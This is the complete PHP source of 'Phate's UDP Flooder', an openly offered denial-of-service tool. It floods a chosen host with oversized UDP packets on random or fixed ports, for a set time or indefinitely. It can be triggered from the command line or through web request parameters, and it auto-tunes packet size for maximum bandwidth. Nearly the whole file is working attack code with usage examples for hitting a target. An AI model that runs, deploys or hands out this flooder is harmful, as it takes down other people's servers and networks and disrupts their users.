<?php
/*
PUF: Phate's UDP Flooder V1.0.10

More info/latest version: 
https://github.com/udp-flooder/puf

The MIT License (MIT)

Copyleft (c) 2013 Phate ~ github.com/udp-flooder/

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
the Software, and to permit persons to whom the Software is furnished to do so,
subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

$version = '1.0.10'; $file = end(explode(DIRECTORY_SEPARATOR, __FILE__)); $cache = true; $cacheData = array();

// Determine web/CLI
if (defined('PHP_SAPI') || function_exists('php_sapi_name')) {
    if (PHP_SAPI == 'cli' || php_sapi_name() == 'cli') {
        echo '===========================' . PHP_EOL;
        echo 'Phate\'s UDP Flooder V' . $version . PHP_EOL;
        $cli = true;
        $args = $_SERVER['argv'];
        if ($_SERVER['argc'] == 1 || $args[1] == '-h' || $args[1] == '-help') {
            echo 'Usage:' . PHP_EOL;
            echo $file . ' [host/ip] [time=300] [port=random] [size=optimised/cache]' . PHP_EOL . PHP_EOL;
            echo $file . ' (shows this)' . PHP_EOL;
            echo $file . ' 1.2.3.4 (floods host for 300 seconds on random ports)' . PHP_EOL;
            echo $file . ' 1.2.3.4 60 (floods host for 60 seconds on random ports)';
            echo $file . ' 1.2.3.4 0 80 (floods host on fixed port, indefinitly)';
            echo $file . ' 1.2.3.4 300 80 25000 (floods host for 300 seconds on fixed port with fixed packet-size, disabling optimised speed)' . PHP_EOL;
            echo $file . ' host.io 0 0 35000 (floods host on random port with fixed packet-size, disabling optimised speed, indefinitly)' . PHP_EOL;
            echo $file . ' host.io -nocache (optimised speed without cache)' . PHP_EOL;
            echo $file . ' -showcache (shows optimised speed/from cache)' . PHP_EOL;
            echo '===========================' . PHP_EOL;
            exit(0);
        }
    }
}
if (!isset($cli)) {
    set_time_limit(0);
    $cli = false;
    @ini_set('output_buffering', 'off');
    @ini_set('zlib.output_buffering', false);
    @ini_set('zlib.output_compression', false);
    @ini_set('implicit_flush', true);
    for ($ob = 0; $ob < ob_get_level(); $ob++) {
        ob_end_flush();
    }
    ob_implicit_flush(true);
    header('Content-type: text/plain');
    header('Cache-control: no-cache');
    echo str_repeat(' ', 1024) . PHP_EOL; // fixes bugs
}

if ($cli) {
    for ($i = 1; $i < count($args); $i++) {
        if (trim($args[$i]) == '-nocache') {
            $cache = false;
            echo '- cache disabled' . PHP_EOL;
        }
        if (trim($args[$i]) == '-showcache') {
            if (file_exists($file . '.dat')) {
                exit(file_get_contents($file . '.dat'));
            }
            exit('No cache available');
        }
    }
}   
else {
    if (isset($args['nocache']) && $args['nocache'] == 'yes') {
        $cache = false;
    }
}

if (file_exists($file . '.dat')) {
    $cacheData = explode(PHP_EOL, file_get_contents($file . '.dat'));
    foreach ($cacheData as $index => $value) {
        $tmp = explode(';', $value);
        $cacheData[$index] = $tmp[0];
    }
}
else if (isset($_SESSION['pufsize'])) {
    $cacheData[] = $_SESSION['pufsize'];
}

if (!$cli) {
    $args = array();
    if (isset($_REQUEST['hostname'])) {
        $args[1] = $_REQUEST['hostname'];
    }
    if (isset($_REQUEST['time'])) {
        $args[2] = $_REQUEST['time'];
    }
    if (isset($_REQUEST['port'])) {
        $args[3] = $_REQUEST['port'];
    }
    if (isset($_REQUEST['size'])) {
        $args[4] = $_REQUEST['size'];
    }
}

if (count($args) >= 2) {
    $host = $args[1];
    if (!isset($args[4])) {
        if ($cache && empty($cacheData)) {
            echo '- no cache available' . PHP_EOL;
            echo '- creating one takes a few seconds, hold on' . PHP_EOL;
            if (!$cli) {
                flush();
                ob_flush();
            }
        }
    }
    $size = isset($args[4]) ? intval($args[4]) : getSize();
    $strt = time();
    $time = (isset($args[2]) ? intval($args[2]) : 300);
    $mxtm = time() + $time;
    $port = isset($args[3]) ? intval($args[3]) : 0;
    $pcks = $last = 0;
    $pckt = str_repeat('P', $size);
    while (true) {
        $time = (time() - $strt);
        if (time() >= $mxtm) {
            echo str_pad(@round($pcks / $time, 2), 15) . "p/s     \t" . str_pad(@round(((($pcks * $size) / 1024) / 1024) / $time, 2), 7) . "MB/s    \t " . str_pad(($mxtm - time()), 5) ." seconds left    " . PHP_EOL;
            break;
        }
        $pcks++;
        $tport = $port;
        if (!$port) {
            $tport = rand(21, 65024);
        }
        $fp = @fsockopen('udp://' . $host, $tport, $ern, $ers, 1);
        if ($fp) {
            fwrite($fp, $pckt);
            fclose($fp);
        }
        if ($last != time()) {
            echo str_pad(@round($pcks / $time, 2), 15) . "p/s     \t" . str_pad(@round(((($pcks * $size) / 1024) / 1024) / $time, 2), 7) . "MB/s    \t " . str_pad(($mxtm - time()), 5) ." seconds left    \r";
            if (!$cli) {
                echo PHP_EOL;
                flush();
                ob_flush();
            }
            $last = time();
        }
    }
    if ($cli) {
        exit(PHP_EOL . '===========================' . PHP_EOL);
    }
}

function getSize() {
    global $cli, $cacheData, $file, $host;
    
    if ($cli) {
        if (!empty($cacheData[2])) {
            return $cacheData[2];
        }
    }
    else {
        if (!empty($_SESSION['pufsize'])) {
            return $_SESSION['pufsize'];
        }
    }
    echo '[NOTICE] Performing size-check, this takes about a minute.' . PHP_EOL;
    $size = 5000;
    $speed = '?';
    $bestsize = 0;
    $bestpackets = 0;
    while ($size <= 65000) {
        $end = time() + 5;
        $packets = 0;
        while (true) {
            if (time() > $end) {
                break;
            }
            $package = str_repeat('X', $size);
            $fp = @fsockopen('udp://' . $host, 80, $ern, $ers, 1);
            if ($fp) {
                @fwrite($fp, $package);
                fclose($fp);
            }
            $packets++;
        }
        
        $toBeat = round( ($bestsize * $bestpackets) / 5 );
        $beatMe = round( ($size * $packets) / 5 );
         $speed = round (($beatMe / 1024) / 1024, 2);
        if ($beatMe >= $toBeat) {
           
            echo '[Update] New speed: ' . $size . ' bytes, ' . $packets . '/s, ' . $speed . 'MB/s' . PHP_EOL;
            $bestsize = $size;
            $bestpackets = $packets;
        }
        else {
            echo '[Skipping] ' .$size . ' bytes, ' . $packets. '/s, ' . $speed . 'MB/s' . PHP_EOL;
        }
        sleep(1);
        $size += 5000;
    }
    
    if ($cli) {
        $fp = @fopen(str_replace('php', 'dat', $file), 'W');
        if (!$fp) {
            echo '[WARNING] Cache file could not be created. Optimised size is ' . $bestsize . ' at ' . $toBeat . ' MB/s' . PHP_EOL;
        }
        else {
            $fw = fwrite($fp, $bestsize . '; packets per request' . PHP_EOL . $toBeat . '; MB/s');
            if (!$fw) {
                echo '[WARNING] Could not write to cache file. Optimised size is ' . $bestsize . ' at ' . $toBeat . ' MB/s' . PHP_EOL;
            }
            fclose($fp);
        }
    }
    else {
        $_SESSION['pufsize'] = $size;
        $_SESSION['pufspeed'] = $speed;
    }
    
    return $size;
}
